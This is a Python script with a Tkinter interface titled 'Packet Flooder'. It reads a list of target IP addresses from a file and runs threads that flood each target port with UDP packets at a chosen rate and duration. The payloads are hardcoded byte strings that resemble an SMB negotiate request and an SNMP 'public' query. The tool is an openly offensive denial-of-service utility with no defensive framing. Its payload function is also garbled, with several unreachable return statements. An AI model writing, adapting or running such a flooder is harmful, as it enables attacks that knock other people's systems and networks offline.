import random
import socket
import time
import threading
from tkinter import Tk, Label, Entry, Button, filedialog

def generate_random_port():
    return random.randint(1, 65535)

def generate_random_payload():
    buff0 = "\x00\x00\x00\x90\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x36\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00"
    buff1 = "\x30\x37\x02\x01\x01"
    buff2 = "\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00"

    payload_length = random.randint(10, 100)  # Payload length between 10 and 100 bytes

    return buff0
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890', k=payload_length))
    return buff1
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890', k=payload_length))
    return buff2
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890', k=payload_length))

def flood(target_ip, target_port, duration, packet_rate):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(generate_random_payload().encode(), (target_ip, target_port))
            time.sleep(1 / packet_rate)
            print(f"Flooding {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            sock.close()

def start_flood(target_ip, target_port, duration, packet_rate):
    threading.Thread(target=flood, args=(target_ip, target_port, duration, packet_rate)).start()

def load_ip_file():
    global ips
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    with open(file_path, 'r') as file:
        ips = file.readlines()
    ips = [ip.strip() for ip in ips if ip.strip()]
    print(f"Loaded IPs: {ips}")

def initiate_flood():
    for ip in ips:
        start_flood(ip, int(port_entry.get()), int(duration_entry.get()), int(rate_entry.get()))

root = Tk()
root.title("Packet Flooder")

port_label = Label(root, text="Target Port:")
port_label.grid(row=0, column=0)
port_entry = Entry(root)
port_entry.grid(row=0, column=1)

duration_label = Label(root, text="Duration (seconds):")
duration_label.grid(row=1, column=0)
duration_entry = Entry(root)
duration_entry.grid(row=1, column=1)

rate_label = Label(root, text="Packet Rate (per second):")
rate_label.grid(row=2, column=0)
rate_entry = Entry(root)
rate_entry.grid(row=2, column=1)

load_file_button = Button(root, text="Load IPs from File", command=load_ip_file)
load_file_button.grid(row=3, columnspan=2)

start_button = Button(root, text="Start Flood", command=initiate_flood)
start_button.grid(row=4, columnspan=2)

root.mainloop()
